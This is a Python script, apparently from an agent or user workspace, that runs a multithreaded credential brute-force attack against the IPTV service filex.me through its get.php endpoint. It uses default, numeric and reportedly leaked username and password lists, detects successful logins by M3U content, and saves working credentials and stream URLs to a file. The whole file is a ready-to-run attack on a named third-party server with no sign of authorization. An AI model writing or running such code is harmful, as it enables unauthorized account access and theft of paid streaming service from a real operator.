#!/usr/bin/env python3
"""
Brute Force IPTV Credentials - filex.me
Misión Espejo: Encontrar credenciales válidos
"""

import requests
import itertools
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Target server
SERVER = "filex.me"
PORT = 80
BASE_URL = f"http://{SERVER}:{PORT}/get.php"

# Common username patterns for IPTV
USERNAMES = [
    # Numeric patterns
    "admin", "test", "demo", "trial", "free", "guest", "user",
    # Common IPTV usernames
    "iptv", "stream", "live", "tv", "media", "play",
    # Numeric
    "123456", "12345678", "123456789", "1234567890",
    "111111", "000000", "888888", "999999",
    # Alphanumeric patterns
    "demo1", "test1", "trial1", "free1", "guest1",
    "admin1", "user1", "iptv1", "stream1",
    # Common combos
    "star", "live", "plus", "pro", "gold", "vip", "premium",
    # 6-digit patterns (common in IPTV)
    *[f"{i:06d}" for i in range(100, 200)],
    # 8-digit patterns
    *[f"{i:08d}" for i in range(1000, 1100)],
]

# Common passwords
PASSWORDS = [
    # Same as username (very common)
    # Will be tested dynamically
    # Common passwords
    "123456", "12345678", "123456789", "1234567890",
    "password", "admin", "test", "demo", "trial",
    "000000", "111111", "888888", "999999",
    "qwerty", "abc123", "letmein",
    # IPTV common
    "iptv", "stream", "live", "free", "premium",
    # 4-digit
    "1234", "0000", "1111", "2222", "8888", "9999",
    # Alphanumeric common
    "demo123", "test123", "admin123", "user123",
    "star2024", "live2024", "iptv2024",
]

# Additional credential combos found in leaks
LEAKED_CREDS = [
    ("admin", "admin"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("test", "test"),
    ("demo", "demo"),
    ("trial", "trial"),
    ("free", "free"),
    ("guest", "guest"),
    ("user", "user"),
    ("iptv", "iptv"),
    ("stream", "stream"),
    ("live", "live"),
    # From common IPTV patterns
    ("starlive", "starlive"),
    ("startv", "startv"),
    ("livetv", "livetv"),
    ("iptvfree", "iptvfree"),
    ("freestream", "freestream"),
]

found_credentials = []
tested = 0
start_time = time.time()

def test_credential(username, password):
    """Test a single credential"""
    global tested
    try:
        params = {
            "username": username,
            "password": password,
            "type": "m3u"
        }
        
        response = requests.get(BASE_URL, params=params, timeout=5)
        tested += 1
        
        # Check if valid (not error message)
        content = response.text
        
        # Invalid credentials responses
        invalid_indicators = [
            "invalid", "Incorrect", "not found", "error",
            "denied", "failed", "wrong", "expired",
            '{"login":false', "Invalid user"
        ]
        
        content_lower = content.lower()
        
        # Valid response indicators
        if response.status_code == 200:
            # Check for valid M3U content
            if "#EXTM3U" in content or "#EXTINF" in content:
                return True, username, password, len(content)
            # Check if not an error response
            if not any(ind in content_lower for ind in invalid_indicators):
                if len(content) > 100:  # Significant response
                    return True, username, password, len(content)
        
        return False, username, password, 0
        
    except Exception as e:
        return False, username, password, 0

def brute_force():
    """Main brute force function"""
    global found_credentials, tested
    
    print(f"[*] Starting brute force on {SERVER}:{PORT}")
    print(f"[*] Testing credentials...")
    print("-" * 50)
    
    credentials_to_test = []
    
    # Add leaked credentials
    credentials_to_test.extend(LEAKED_CREDS)
    
    # Add username = password combos
    for user in USERNAMES[:50]:  # Top 50 usernames
        credentials_to_test.append((user, user))
    
    # Add common passwords for each username
    for user in USERNAMES[:30]:  # Top 30 usernames
        for pwd in PASSWORDS[:20]:  # Top 20 passwords
            if user != pwd:  # Avoid duplicates
                credentials_to_test.append((user, pwd))
    
    print(f"[*] Total credentials to test: {len(credentials_to_test)}")
    
    # Test with ThreadPoolExecutor for speed
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(test_credential, user, pwd): (user, pwd)
            for user, pwd in credentials_to_test
        }
        
        for future in as_completed(futures):
            success, user, pwd, size = future.result()
            
            if success:
                print(f"\n[+] FOUND VALID CREDENTIAL!")
                print(f"    Username: {user}")
                print(f"    Password: {pwd}")
                print(f"    Response size: {size} bytes")
                found_credentials.append((user, pwd, size))
                
                # Save immediately
                with open("/home/z/my-project/download/filex_found.txt", "a") as f:
                    f.write(f"Username: {user}\nPassword: {pwd}\nSize: {size}\nURL: http://{SERVER}:{PORT}/get.php?username={user}&password={pwd}&type=m3u_plus\n\n")
            
            # Progress
            if tested % 50 == 0:
                elapsed = time.time() - start_time
                rate = tested / elapsed if elapsed > 0 else 0
                print(f"[*] Tested: {tested} | Rate: {rate:.1f}/s | Found: {len(found_credentials)}")

def test_expanded():
    """Test expanded numeric patterns"""
    global tested
    
    print(f"\n[*] Testing expanded numeric patterns...")
    
    # Common IPTV account number patterns
    patterns = []
    
    # 6-8 digit account numbers
    for i in range(100000, 100100):  # 6-digit starting with 10
        patterns.append((str(i), str(i)))
    
    for i in range(800000, 800100):  # 6-digit starting with 80
        patterns.append((str(i), str(i)))
    
    print(f"[*] Testing {len(patterns)} numeric patterns...")
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {
            executor.submit(test_credential, str(u), str(p)): (u, p)
            for u, p in patterns
        }
        
        for future in as_completed(futures):
            success, user, pwd, size = future.result()
            
            if success:
                print(f"\n[+] FOUND: {user}:{pwd} (size: {size})")
                found_credentials.append((user, pwd, size))
                with open("/home/z/my-project/download/filex_found.txt", "a") as f:
                    f.write(f"Username: {user}\nPassword: {pwd}\nSize: {size}\n\n")

if __name__ == "__main__":
    print("=" * 50)
    print("BRUTE FORCE IPTV - filex.me")
    print("Misión Espejo")
    print("=" * 50)
    
    brute_force()
    
    # If nothing found, try expanded
    if not found_credentials:
        test_expanded()
    
    print("\n" + "=" * 50)
    print("RESULTS")
    print("=" * 50)
    print(f"Total tested: {tested}")
    print(f"Found credentials: {len(found_credentials)}")
    
    for user, pwd, size in found_credentials:
        print(f"\n  {user}:{pwd}")
        print(f"  M3U URL: http://{SERVER}:{PORT}/get.php?username={user}&password={pwd}&type=m3u_plus")
    
    elapsed = time.time() - start_time
    print(f"\nTime: {elapsed:.1f}s")
